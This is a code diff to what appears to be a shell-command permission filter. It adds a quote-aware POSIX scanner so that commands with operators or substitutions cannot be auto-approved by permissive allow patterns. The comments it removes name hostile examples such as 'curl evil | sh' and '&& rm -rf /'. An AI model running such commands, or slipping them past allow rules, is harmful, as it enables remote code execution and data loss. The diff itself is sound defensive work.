@@ -158,16 +158,63 @@ _STATIC_BLOCK_RES = [
 ]
 
 
+def _shell_scan(command: str) -> tuple[str, bool]:
+    """Return unquoted text and whether POSIX shell syntax needs scrutiny."""
+    bare = []
+    quote = None
+    word_start = True
+    active = False
+    i = 0
+    while i < len(command):
+        ch = command[i]
+        if quote == "'":
+            if ch == "'":
+                quote = None
+            i += 1
+            continue
+        if quote == '"':
+            if ch == '"':
+                quote = None
+            elif ch == "\\":
+                if i + 1 == len(command):
+                    active = True
+                else:
+                    i += 1
+            elif ch == "`" or (ch == "$" and i + 1 < len(command)
+                             and command[i + 1] in "({"):
+                active = True
+            i += 1
+            continue
+        if ch == "\\":
+            if i + 1 == len(command):
+                active = True
+            else:
+                bare.append(command[i + 1])
+                word_start = False
+                i += 1
+        elif ch in "'\"":
+            quote = ch
+            word_start = False
+        elif ch == "#" and word_start:
+            break
+        else:
+            bare.append(ch)
+            if ch in "|;&><\n":
+                active = True
+            elif ch == "`" or (ch == "$" and i + 1 < len(command)
+                               and command[i + 1] in "({"):
+                active = True
+            word_start = ch.isspace() or ch in "|;&><"
+        i += 1
+    return "".join(bare), active or quote is not None
+
+
 def _unquoted(command: str) -> str:
-    """Remove quoted segments ('…' and "…") — a curl|sh inside an echo string
-    literal is data, not an execution."""
-    return re.sub(r"'[^']*'|\"[^\"]*\"", '""', command)
+    return _shell_scan(command)[0]
 
 
-# Substitution forms that remain executable inside double quotes (backticks
-# survive even single quotes): `$(cmd)`, `${var}`, `cmd`. Checked against the
-# RAW command — quote-stripped text must never vouch for these.
-_SUBSTITUTION_RE = re.compile(r"`|\$\(|\$\{")
+def _has_active_shell_syntax(command: str) -> bool:
+    return _shell_scan(command)[1]
 
 
 def _static_block(command: str) -> Optional[str]:
@@ -195,16 +242,7 @@ def _compile_res(patterns) -> list:
 
 
 def _overrides(cfg, command):
-    # force_allow honors only operator-free commands (shell operators outside
-    # quotes): a pattern with a permissive tail (e.g. `(?:\s.*)?`) must not be
-    # satisfiable by appending `&& rm -rf /` or ` ; curl evil | sh`. Operator
-    # commands fall through to the normal layers — this only ever adds
-    # scrutiny, never removes it.
-    # Command substitution is the exception to quote-stripping: `$()`,
-    # `${...}`, and backticks stay executable inside double quotes, so
-    # _SUBSTITUTION_RE runs on the raw command before force_allow matching.
-    if (not re.search(r"[|;&`$><\n]", _unquoted(command))
-            and not _SUBSTITUTION_RE.search(command)):
+    if not _has_active_shell_syntax(command):
         for rx in _compile_res(cfg["force_allow_patterns"]):
             if rx.search(command):
                 return "allow"
